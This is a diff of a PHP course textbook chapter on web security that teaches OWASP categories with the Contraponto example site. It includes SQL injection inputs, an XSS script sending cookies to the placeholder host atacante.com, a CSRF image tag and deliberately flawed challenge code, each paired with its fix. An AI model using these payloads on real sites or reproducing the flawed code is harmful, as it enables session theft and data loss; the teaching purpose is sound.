@@ -12,76 +12,493 @@ lang: en-GB
 </div>
 ```
 
+Before the connection to the database (@sec-08-connecting-en), the Contraponto site only displayed information written in the code. With the database, it now receives text from strangers and stores it. This brings three responsibilities: protecting the data of readers and staff, preventing anyone from reading or changing what is not theirs, and keeping the service running with its data intact. Security is not a feature added at the end: it accompanies every line of code written.
+
+## The Reference: OWASP Top 10 {#sec-09-owasp-en}
+
+The most widely used reference for classifying web application vulnerabilities is the `OWASP Top 10`, a list of the most critical security risks, published by the *Open Worldwide Application Security Project* and periodically updated based on the analysis of data on real vulnerabilities [@owasp_top10_2025]. The most recent edition is the 2025 one. This chapter covers nine security topics, which correspond to six categories of the list:
+
+| Chapter topic | Code | OWASP Top 10:2025 category |
+|:-----------------------------|:------:|:---------------------------------|
+| *SQL Injection* | A05 | *Injection* |
+| XSS | A05 | *Injection* |
+| CSRF | A01 | *Broken Access Control* |
+| Passwords and *hash* | A04 | *Cryptographic Failures* |
+| Secure *login* | A07 | *Authentication Failures* |
+| Third-party dependencies | A03 | *Software Supply Chain Failures* |
+| Least privilege | A01 | *Broken Access Control* |
+| Validate and escape | A05 | *Injection* |
+| Errors in production | A02 | *Security Misconfiguration* |
+
+: The chapter topics and the OWASP Top 10:2025 categories. {#tbl-09-owasp-en}
+
+The other four categories of the list (A06, A08, A09 and A10) are not covered in this chapter.
+
+## Never Trust Client Data {#sec-09-principle-en}
+
+In a web application, the client (the *browser*) requests and displays pages, the server (PHP) handles the request and builds the page, and the database (MySQL) stores and returns the data. An attacker acts on the first link: they change what the client sends. Therefore, everything that arrives from the client (`$_GET`, `$_POST`, `$_COOKIE`) may have been altered, and even a valid request may not have been intended. This is the principle that runs through the whole chapter, and it gives rise to three classic attacks:
+
+- **SQL Injection** (A05): the data reaches the database carrying a malicious command, which the database executes;
+- **XSS** (A05): the data returns to another user's *browser* carrying malicious code, which that *browser* executes;
+- **CSRF** (A01): the *browser* sends a request that looks like it comes from the user, with the session *cookie*.
+
 ## Vulnerabilities in Custom Code {#sec-09-custom-code-en}
 
-The most widely used reference for classifying web application vulnerabilities is the `OWASP Top 10`, a list of the most critical security risks, maintained by the *Open Worldwide Application Security Project* and periodically updated based on the analysis of tens of thousands of real vulnerabilities [@owasp_top10_2025]. Three of these vulnerabilities are particularly relevant to a PHP application like the ones developed in this course:
+The vulnerabilities in this section are in code written by the programmer, and each one has a defence that is applied in that same code.
 
 ### SQL Injection {#sec-09-sql-injection-en}
 
-SQL Injection occurs when data supplied by the user is inserted directly into an SQL statement, allowing an attacker to change the meaning of that statement. Consider a login form implemented insecurely, through direct concatenation:
+*SQL Injection* occurs when text typed by the user is pasted into an SQL statement, and MySQL can no longer tell command from value (@sec-08-prepared-statements-en). The data then carries a malicious command, which the database executes. Consider a `delete.php` that joins the `id` to the SQL statement, instead of using a `?`:
 
 ```php
 <?php
-$utilizador = $_POST["utilizador"];
-$password = $_POST["password"];
-
-$sql = "SELECT * FROM utilizadores WHERE utilizador = '$utilizador' "
-     . "AND password = '$password'";
-$resultado = $conexao->query($sql);
+$id = $_GET["id"];
+$conexao->query("DELETE FROM artigos WHERE id = $id");
 ```
 
-If an attacker enters, in the `utilizador` field, the text `' OR '1'='1' -- `, the SQL statement actually executed becomes:
+With the normal request, `delete.php?id=3`, the statement executed is `DELETE FROM artigos WHERE id = 3`, which deletes article 3. But the attacker can request `delete.php?id=0 OR 1=1`:
+
+```sql
+DELETE FROM artigos WHERE id = 0 OR 1=1
+```
+
+The expression `1=1` is always true: with `OR`, the condition becomes true for every row, regardless of the `id`, and the `DELETE` deletes all the articles. The `query()` method does not execute two statements in the same command, so it is not possible to add, for instance, a `DROP` or another `DELETE`, but changing a condition is enough to do damage.
+
+The same mechanism allows entry into a restricted area without knowing the password. Consider a login form implemented insecurely, through direct concatenation:
+
+```php
+<?php
+require "config.php";
+$utilizador = $_POST["utilizador"];
+$password = $_POST["password"];
+$sql = "SELECT * FROM utilizadores
+        WHERE utilizador = '$utilizador'
+        AND password = '$password'";
+$resultado = $conexao->query($sql);
+if ($linha = $resultado->fetch_assoc()) {
+    echo "Sessão iniciada.";
+}
+```
+
+If an attacker enters, in the `utilizador` field, the text `' OR '1'='1' -- ` (with a space at the end of the text; without it, MySQL reports a syntax error), the SQL statement actually executed becomes:
 
 ```sql
 SELECT * FROM utilizadores
-WHERE utilizador = '' OR '1'='1' -- ' AND password = '...'
+WHERE utilizador = '' OR '1'='1'
+-- ' AND password = '...'
 ```
 
-Since `'1'='1'` is always true, and `--` turns the rest of the line into an SQL comment, ignoring the password check, this query returns the first user in the table, allowing the attacker to log in without knowing any valid password. It is avoided by always using *prepared statements*, as seen in @sec-08-prepared-statements-en, which treat the content of `$_POST` always as a value, never as part of the SQL command, regardless of what that value contains.
+Since `'1'='1'` is always true, and `--` turns the rest of the line into an SQL comment, the password is never checked. The query returns every row and PHP uses the first one, so the attacker logs in as the first user in the table, without knowing any valid password.
+
+The defence is the one seen in @sec-08-prepared-statements-en: always use *prepared statements*. The command goes with a `?` in place of the values, and the values travel separately. The attacker's text stops being part of the command and becomes just a value to look for, which does not exist:
+
+```php
+<?php
+require "config.php";
+$stmt = $conexao->prepare(
+    "SELECT * FROM utilizadores
+     WHERE utilizador = ? AND password = ?"
+);
+$stmt->bind_param("ss", $_POST["utilizador"], $_POST["password"]);
+$stmt->execute();
+$resultado = $stmt->get_result();
+if ($linha = $resultado->fetch_assoc()) {
+    echo "Sessão iniciada.";
+} else {
+    echo "Utilizador ou palavra-passe inválidos.";
+}
+```
+
+Nobody is called `' OR '1'='1' -- `, so the *login* fails. One problem remains to be solved, however: the password is still compared in plain text (@sec-09-passwords-en).
 
 ### XSS (Cross-Site Scripting) {#sec-09-xss-en}
 
-XSS occurs when data supplied by a user is displayed to other users without being properly handled, allowing an attacker to inject JavaScript code that runs in the *browser* of whoever views that page. Consider a comment box that displays the submitted text directly:
+XSS (*Cross-Site Scripting*, in which the letter "X" stands for "*Cross*") occurs when a text written by a user, with malicious code inserted in it, is shown to other users without being handled: the *browser* interprets that code and executes it. The attacker's code thus runs inside another site, the one under attack. Consider the comments page of an article, which displays the submitted text directly:
 
 ```php
 <?php
 echo "<p>" . $_POST["comentario"] . "</p>";
 ```
 
-If an attacker submits, as a comment, the text `<script>document.location='http://atacante.com/roubo?c='+document.cookie</script>`, that JavaScript code becomes part of the page like any other, and is automatically executed in the *browser* of any other user who visits that page, potentially, for example, sending their session *cookies* to a server controlled by the attacker. It is avoided by always escaping user-generated content before displaying it in HTML, with the `htmlspecialchars()` function, which converts special HTML characters, such as `<` and `>`, into their harmless equivalents:
+A normal comment, such as `Muito bom!`, appears as it was written. A comment with `<b>Muito bom!</b>` appears in bold, because the *browser* interprets the tag. And a comment with a `<script>` shows nothing, but the code runs. The code inserted in the text has become part of the page, and the *browser* cannot tell the site's code from the code inserted by the visitor.
+
+The attack unfolds in five steps. The attacker writes a malicious comment, for example:
+
+```html
+<script>document.location='http://atacante.com/roubo?c='+document.cookie</script>
+```
+
+The Contraponto site stores and displays it. When an authenticated user, such as Rita, the site manager, opens the page, she receives it with the `<script>` inside, and the code runs in her *browser*. The *script* sends this site's session *cookie* to the attacker, without Rita seeing anything, and the attacker uses that *cookie* to enter the site as Rita, with her privileges (@sec-07-sessions-en). Note that the *script* can only read the *cookies* of the site itself: those of other sites, such as the bank, remain out of reach.
+
+The defence is to always escape the text coming from users before displaying it in HTML, with the `htmlspecialchars()` function. This function replaces the special HTML characters (`<`, `>`, `&` and quotes) with harmless entities, and the *browser* displays the text instead of executing it:
 
 ```php
 <?php
 echo "<p>" . htmlspecialchars($_POST["comentario"]) . "</p>";
 ```
 
-This way, the attacker's text is shown literally on the page, as visible text, and is not interpreted as code.
+| What the attacker writes | The generated HTML | What the *browser* does |
+|:----------------------|:----------------------------------|:-------------------------|
+| `<script>alert(1)</script>` | `&lt;script&gt;alert(1)&lt;/script&gt;` | shows the text, does not execute it |
+
+: The effect of `htmlspecialchars()`. {#tbl-09-escape-en}
+
+This way, the attacker's text is shown literally on the page, as visible text, and is not interpreted as code. The rule is to always escape on output: all text coming from users, before displaying it in HTML.
 
 ### CSRF (Cross-Site Request Forgery) {#sec-09-csrf-en}
 
-CSRF occurs when an attacker tricks the *browser* of an already-authenticated user into sending, without the user noticing, a request to an application where they have an active session, exploiting the fact that the *browser* automatically sends session *cookies* on any request to that domain, as seen in @sec-07-cookies-en. Imagine a banking application with a transfer implemented as a simple `GET` request:
+CSRF (*Cross-Site Request Forgery*) is a request that is forged (*forgery*) from another site (*cross-site*). It occurs when an attacker tricks the *browser* of an already-authenticated user into sending, without the user noticing, a request to an application where they have an active session, exploiting the fact that the *browser* automatically sends session *cookies* on any request to that domain, as seen in @sec-07-cookies-en. The attacked site receives a request that looks like it comes from Rita, but it was the attacker's page that made it be sent.
+
+Consider the `delete.php` of @sec-08-crud-en, in which, to delete a record, it is enough for the *browser* of Rita (authenticated on the Contraponto site) to request this address:
 
 ```
-GET /transferir?destino=1234&valor=500
+GET /delete.php?id=3
 ```
 
-If a user, authenticated with that bank, visits, in another *browser* tab, a malicious page containing `<img src="https://banco.com/transferir?destino=1234&valor=500">`, the *browser* tries to load that "image", automatically sending the request to the bank, along with the user's valid session *cookie*, without the user having clicked anything. It is avoided in two complementary ways: never implement operations that change data as a simple `GET`, as already recommended in @sec-07-get-vs-post-en, and include, in every sensitive form, a unique, unpredictable token, generated by the server and verified before processing the request, which a malicious page, hosted on another domain, has no way of knowing or reproducing.
+If the attacker's page has, in its HTML, an "image" that is invisible to Rita (`width="0"`, `height="0"`), in which the `src`, which should be the address of an image, contains the address of `delete.php`:
 
-In all these cases, the underlying principle is the same: never trust data coming from the client, whether from a form, a URL parameter or a *cookie*, without first validating and handling it properly.
+```html
+<img src="https://contraponto.example/delete.php?id=3" width="0" height="0">
+```
+
+then, when Rita visits that page, the *browser* sends the request when loading the "image" and attaches the session *cookie* by itself: it is a `GET` that deletes data. `delete.php` sees a valid session and deletes article 3, without Rita having clicked anything. The attacker never sees the *cookie* (unlike XSS, in which they steal it): they use Rita's *browser* to send the request.
+
+The defence has two complementary parts. The first is never to change data through `GET`, as already recommended in @sec-07-get-vs-post-en (`GET` reads, `POST` changes). The second is to put, in every sensitive form, an unpredictable *token*, stored in the session and checked before acting. The form generates the *token* and sends it in a hidden field:
+
+```php
+<?php
+session_start();
+if (empty($_SESSION["token"])) {
+    $_SESSION["token"] = bin2hex(random_bytes(32));
+}
+?>
+<form action="delete.php" method="post">
+  <input type="hidden" name="id" value="3">
+  <input type="hidden" name="token"
+         value="<?= $_SESSION["token"] ?>">
+  <button>Apagar</button>
+</form>
+```
+
+The `random_bytes(32)` function generates unpredictable values, `bin2hex()` converts them to text and `hash_equals()` compares the two *tokens*. `delete.php` rejects the request if the *token* is missing or does not match:
+
+```php
+<?php
+session_start();
+if (!isset($_SESSION["token"], $_POST["token"])
+    || !hash_equals($_SESSION["token"],
+                    $_POST["token"])) {
+    http_response_code(403);
+    exit("Pedido inválido.");
+}
+// valid token: delete with a prepared statement
+```
+
+The `if` reads piece by piece:
+
+1. `!isset($_SESSION["token"], $_POST["token"])`: the `!` means "not", so the condition is true if either of the two *tokens* is missing;
+2. `||` means "or": it is enough for one of the conditions to be true to reject the request. If the first is true, the second is not even evaluated, which guarantees that `hash_equals()` never receives a missing value;
+3. `!hash_equals(...)`: true if the two *tokens* are different;
+4. `{ ... }`: replies with the 403 code and `exit` ends the *script*.
+
+The attacker's page does not know the *token*: the *browser* does not let it read the Contraponto page (the *same-origin* policy), so it cannot include the *token* in the request.
+
+### Plain-Text Passwords {#sec-09-passwords-en}
+
+If passwords are stored exactly as they were typed, this is what the attacker sees if they steal the `utilizadores` table:
+
+| id | utilizador | password |
+|:--:|:-----------|:----------------|
+| 1 | rita | contraponto2026 |
+| 2 | tiago | tiago123 |
+| 3 | joana | 12345678 |
+
+: The `utilizadores` table with plain-text passwords. {#tbl-09-plain-text-en}
+
+An *SQL Injection*, a configuration error or a stolen backup expose the whole table. The attacker gets each person's password, and people reuse passwords on other services. Even whoever administers the site can read the users' passwords. This is how the *login* in @sec-09-sql-injection-en compares them, and this is why a password must never be stored: what is stored is a kind of fingerprint of it.
+
+#### The *hash* {#sec-09-hash-en}
+
+A *hash* is the result of a function that turns the password into a fixed-size value. It identifies the password but does not allow it to be reconstructed: the password cannot be recovered from the *hash*, it can only be guessed, by trial and error. The database stores only the *hash*, and the real password is never stored. At *login*, PHP checks whether what the person typed as a password matches the stored *hash*.
+
+PHP has two functions for this. At registration, `password_hash()` creates the *hash*, and at login, `password_verify()` checks it:
+
+```php
+<?php
+$hash = password_hash(
+    $_POST["password"], PASSWORD_DEFAULT
+);
+```
+
+```php
+<?php
+// $hash comes from the database
+if (password_verify(
+        $_POST["password"], $hash)) {
+    // correct password
+}
+```
+
+Two runs of `password_hash()` with the same password give different results, for example:
+
+```
+$2y$12$BpqtsRr5RdRVkRxTwYNZr.xd21tabzoCdzCgglor5pk9Ilryp9Xt2
+$2y$12$JN664fXU3AqFVrjy2BYRruHKFpVmDZnHpk4rHlZTo5mSHGVvCrjnC
+```
+
+This is normal. PHP adds a random value, the *salt*, to the password before calculating, and the same text never gives the same *hash*: two people with the same password end up with different *hashes*. `password_verify()` reads the *salt* inside the stored *hash* and repeats the calculation.
+
+Each *hash* takes up 60 characters and already includes the algorithm and the *salt*. The `PASSWORD_DEFAULT` constant picks the recommended algorithm (today, *bcrypt*) and may change, which is why the `password` column becomes `VARCHAR(255)`. A weak password, such as `12345678`, will still be discovered: the *hash* protects the table, not poor choices.
+
+#### Registration and *login* {#sec-09-register-login-en}
+
+`registo.php` stores only the *hash*, and `login.php` searches only by user:
+
+```php
+<?php
+require "config.php";
+$utilizador = $_POST["utilizador"];
+$hash = password_hash($_POST["password"],
+                      PASSWORD_DEFAULT);
+$stmt = $conexao->prepare(
+    "INSERT INTO utilizadores
+     (utilizador, password) VALUES (?, ?)"
+);
+$stmt->bind_param("ss", $utilizador, $hash);
+$stmt->execute();
+```
+
+```php
+<?php
+require "config.php";
+$stmt = $conexao->prepare(
+    "SELECT password FROM utilizadores
+     WHERE utilizador = ?"
+);
+$stmt->bind_param("s", $_POST["utilizador"]);
+$stmt->execute();
+$resultado = $stmt->get_result();
+$linha = $resultado->fetch_assoc();
+if ($linha && password_verify($_POST["password"],
+                              $linha["password"])) {
+    session_start();
+    $_SESSION["utilizador"] = $_POST["utilizador"];
+    header("Location: painel.php");
+} else {
+    echo "Utilizador ou palavra-passe inválidos.";
+}
+```
+
+This *login* differs from the one in the *SQL Injection* section in four ways:
+
+1. Registration stores only the *hash*;
+2. The *login* searches only by user: the password never enters the SQL;
+3. If the user does not exist, the `$linha &&` avoids checking the password;
+4. The error message does not say whether the user or the password failed, so as not to reveal to an attacker that a given username exists.
 
 ## Vulnerabilities in Third-Party Dependencies {#sec-09-dependencies-en}
 
-The attack surface of a website is not limited to the code written directly by its programmer. Much of today's Web is built on content management systems, such as `WordPress`, extended through third-party *plugins*, often developed by small teams or even a single independent programmer. According to Patchstack's 2025 security report, 91% of the vulnerabilities found in the WordPress ecosystem that year were located in *plugins*, not in the `WordPress` core, and more than half of the recorded infections resulted from outdated *plugins* [@patchstack_2025_report].
+The attack surface of a website is not limited to the code written directly by its programmer. Much of today's Web is built on content management systems, such as `WordPress`, extended through third-party *plugins*, often developed by very small teams or even a single independent programmer. According to Patchstack's report *State of WordPress Security in 2026*, 91% of the new vulnerabilities in the WordPress ecosystem in 2025 were in *plugins* and 9% in themes; the WordPress core had only 6, out of more than 11,000 (11,334), all of them low priority [@patchstack_2026_report].
 
-This reality led the most recent update of the OWASP Top 10 to introduce a category dedicated to failures in the software supply chain (*Software Supply Chain Failures*), recognising that an application's security also depends on the security of every library, *framework* and extension it relies on, not just the code written by the team itself [@owasp_top10_2025]. This is why, in practice, hosting providers sometimes suspend access to a website until its vulnerable dependencies are updated: the vulnerability may not be in a single line of code written by the site's owner, but the risk it represents is just as real.
+This reality led the most recent update of the OWASP Top 10 to keep a category dedicated to failures in the software supply chain (*Software Supply Chain Failures*, A03), recognising that an application's security also depends on the security of every library, *framework* and extension it relies on, not just the code written by the team itself [@owasp_top10_2025]. A library may, moreover, depend on another vulnerable one (transitive dependencies): this is the case of Log4Shell (2021), a flaw in a *logging* library present in thousands of applications. The flaw may be in code that the site's owner never wrote, but the risk it represents is just as real.
+
+In the case of Contraponto, the site does not use third-party libraries, but it runs on third-party *software*, the web server and MySQL, which also have flaws.
 
 ## Best Practices {#sec-09-best-practices-en}
 
-A few simple practices significantly reduce the security risk of a web application:
+A few simple practices significantly reduce the security risk of a web application.
 
-- **Regular updates**: keep the underlying *software* (PHP itself, the web server, the database management system) and all third-party dependencies and extensions updated to the latest version, since many vulnerabilities are only exploited after they become publicly known;
-- **Principle of least privilege**: every component of an application, and every database user, should have only the permissions strictly necessary for its function, never full access for convenience;
-- **Data validation and sanitisation**: always treat any data coming from outside the application with suspicion, validating its format and sanitising its content before using it, whether in a database query or on a page shown to another user.
+### Regular updates {#sec-09-updates-en}
+
+Many flaws are only exploited after they become public, and the interval between disclosure and exploitation can be very short. PHP, the web server and MySQL should be kept up to date (old versions stop receiving fixes, and their flaws become public and documented), as should *plugins* and themes, installing only the necessary ones, from trustworthy sources, and removing those that are no longer used. Checking the version is the first step to knowing whether there are fixes to apply:
+
+```bash
+php -v           # PHP version
+mysql --version  # MySQL version
+```
+
+Updating is not just running a command: it is advisable to test first and have a backup, because an update can also fail.
+
+### Principle of least privilege {#sec-09-least-privilege-en}
+
+Every component of an application, and every database user, should have only the permissions it needs, never full access for convenience. With the SQL permission-control commands (@sec-08-sql-en), a user is created just for the application:
+
+```sql
+-- creates the user that the application uses
+CREATE USER 'contraponto_app'@'localhost'
+    IDENTIFIED BY 'palavra-passe-forte';
+
+-- only these operations, only on this database
+GRANT SELECT, INSERT, UPDATE, DELETE
+    ON contraponto.* TO 'contraponto_app'@'localhost';
+```
+
+This account cannot drop tables, change the structure (`DROP`, `ALTER`, `CREATE`) or access other databases. It can still read and change the Contraponto data, however: least privilege limits the damage, it does not prevent the attack. Using the `root` user in a web application is a serious bad practice: with an *SQL Injection*, the attacker would have full access to the database server. The same principle applies to files: the web server should only be able to write to the folders it needs (for example, the one for uploaded files), never to the PHP code.
+
+### Validate and escape data {#sec-09-validate-escape-en}
+
+All data coming from outside (`$_GET`, `$_POST`, `$_COOKIE`, HTTP headers) is treated as untrusted. Validation checks whether the data has the expected format, such as a non-empty text, a number or a date:
+
+```php
+<?php
+if (!isset($_POST["comentario"])
+    || $_POST["comentario"] === "") {
+    exit("Escreve um comentário.");
+}
+```
+
+Escaping makes the data safe for the context in which it will be used:
+
+| Context | How to handle it | Prevents |
+|:--------|:-----------------------|:-----------------------------|
+| HTML | `htmlspecialchars()` | XSS |
+| SQL | *prepared statements* | *SQL Injection* |
+
+: Escaping according to context. {#tbl-09-contexts-en}
+
+Validating does not replace escaping: a non-empty comment passes validation and may contain `<script>`. And validation done in the *browser* does not protect, because an attacker sends the request without going through the form.
+
+### Do not show errors in production {#sec-09-errors-production-en}
+
+During development, `display_errors` helps find out what is failing (@sec-08-errors-en). On a production site, the same message helps the attacker: it reveals names of tables, files and users. The development configuration shows errors on screen; the production one logs them without showing them:
+
+```php
+<?php
+// development
+error_reporting(E_ALL);
+ini_set("display_errors", 1);
+```
+
+```php
+<?php
+// production
+error_reporting(E_ALL);
+ini_set("display_errors", 0);
+ini_set("log_errors", 1);
+```
+
+A visitor could read, for example, `Access denied for user 'utilizador'@'localhost'`, which reveals the name of the database user, or `You have an error in your SQL syntax`, which confirms that their input reached the query (*SQL Injection*). In production, errors are still all logged, but they go to the server's error log, which only the team reads. In practice, these options are set in `php.ini`, the PHP configuration on the server, and not on each page.
+
+## Challenge: Find the Flaws {#sec-09-challenge-en}
+
+Tiago is going to implement the Contraponto administration panel. Each of Rita's requirements translates into threats and defences from this chapter:
+
+| Rita's requirement | Threat | Defence |
+|:----------------------------|:----------------------------|:------------------------------|
+| Only Rita manages the articles | Requests without checking the session; CSRF | Check the session (@sec-07-sessions-en); POST and CSRF *token* |
+| Comments cannot be used for attacks | XSS | `htmlspecialchars()` on all displayed text |
+| Secure accounts and passwords | Stolen table; guessed passwords | `password_hash()` and `password_verify()` |
+| The magazine's data is protected | *SQL Injection*; account with too many permissions | *Prepared statements*; least privilege |
+| The site stays secure over time | Flaws in third-party *software*; visible errors | Update everything; errors only in the log |
+
+: Rita's requirements. {#tbl-09-requirements-en}
+
+Tiago wrote the first version of two files. There are six flaws from this chapter: the challenge is to find and fix them.
+
+```php
+<?php
+// login.php
+require "config.php";
+$u = $_POST["utilizador"];
+$p = $_POST["password"];
+$r = $conexao->query("SELECT * FROM utilizadores
+    WHERE utilizador = '$u' AND password = '$p'");
+if ($r->fetch_assoc()) {
+    session_start();
+    $_SESSION["utilizador"] = $u;
+    echo "Sessão iniciada.";
+}
+```
+
+```php
+<?php
+// comentarios.php
+require "config.php";
+$c = $_GET["apagar"];
+$conexao->query("DELETE FROM comentarios
+                WHERE id = $c");
+$r = $conexao->query("SELECT texto FROM comentarios");
+while ($linha = $r->fetch_assoc()) {
+    echo "<p>" . $linha["texto"] . "</p>";
+}
+```
+
+The challenge has three steps:
+
+1. Say which attack each flaw allows;
+2. Rewrite the two files with the appropriate defence (@sec-09-sql-injection-en, @sec-09-xss-en, @sec-09-csrf-en and @sec-09-passwords-en);
+3. Add the registration page, with `password_hash()`.
+
+### The corrected files {#sec-09-solution-en}
+
+The six flaws and their fixes are marked by numbers in the comments of the corrected files:
+
+```php
+<?php
+// login.php
+require "config.php";
+$u = $_POST["utilizador"];
+$p = $_POST["password"];
+$stmt = $conexao->prepare(  // 1
+    "SELECT password FROM utilizadores
+     WHERE utilizador = ?");
+$stmt->bind_param("s", $u);
+$stmt->execute();
+$linha = $stmt->get_result()->fetch_assoc();
+if ($linha &&
+    password_verify($p, $linha["password"])) {  // 2
+    session_start();
+    $_SESSION["utilizador"] = $u;
+    echo "Sessão iniciada.";
+}
+```
+
+```php
+<?php
+// comentarios.php
+require "config.php";
+session_start();
+if (!isset($_SESSION["utilizador"])) {  // 5
+    exit("Acesso negado.");
+}
+if (isset($_SESSION["token"], $_POST["apagar"],  // 3
+        $_POST["token"])
+    && hash_equals($_SESSION["token"], $_POST["token"])) {
+    $stmt = $conexao->prepare(  // 4
+        "DELETE FROM comentarios WHERE id = ?");
+    $stmt->bind_param("i", $_POST["apagar"]);
+    $stmt->execute();
+}
+$r = $conexao->query("SELECT texto FROM comentarios");
+while ($linha = $r->fetch_assoc()) {
+    echo "<p>" .
+         htmlspecialchars($linha["texto"]) . "</p>";  // 6
+}
+```
+
+1. *SQL Injection* in the *login*: *prepared statements*;
+2. plain-text password: `password_verify()` on the *hash* (registration is in @sec-09-register-login-en);
+3. CSRF: delete through POST, with a *token*, instead of GET (the form with the *token* is the one in @sec-09-csrf-en);
+4. *SQL Injection* in the `DELETE`: *prepared statement*;
+5. missing session check: only someone who has logged in can delete;
+6. XSS: `htmlspecialchars()` when displaying the comments.
+
+## Summary {#sec-09-summary-en}
+
+The nine topics of the chapter group into six OWASP Top 10:2025 categories, ordered by code:
+
+| OWASP | Category | Topics and defences |
+|:-----:|:-------------------------------|:--------------------------------------|
+| A01 | *Broken Access Control* | CSRF: POST and *token*; least privilege |
+| A02 | *Security Misconfiguration* | Errors in production: only in the server log |
+| A03 | *Software Supply Chain Failures* | Third-party dependencies: update everything |
+| A04 | *Cryptographic Failures* | Passwords: `password_hash()` |
+| A05 | *Injection* | *SQL Injection*: *prepared statements*; XSS: `htmlspecialchars()`; validate and escape |
+| A07 | *Authentication Failures* | Secure *login*: same message for any failure |
+
+: Six categories, nine defences. {#tbl-09-summary-en}
+
+The common idea is never to trust data coming from the client, and to limit the damage if a defence fails. These are, however, only the basic protections. Anyone who wants to go further can study the `HttpOnly` and `SameSite` attributes of the session *cookie* (@sec-apE-cookies-en), which limit the theft of the *cookie* through XSS and its being sent in forged requests, such as those described in the sections on XSS and CSRF. They are not part of this course's syllabus.
 
 ## References {#sec-09-references-en .unnumbered}
 
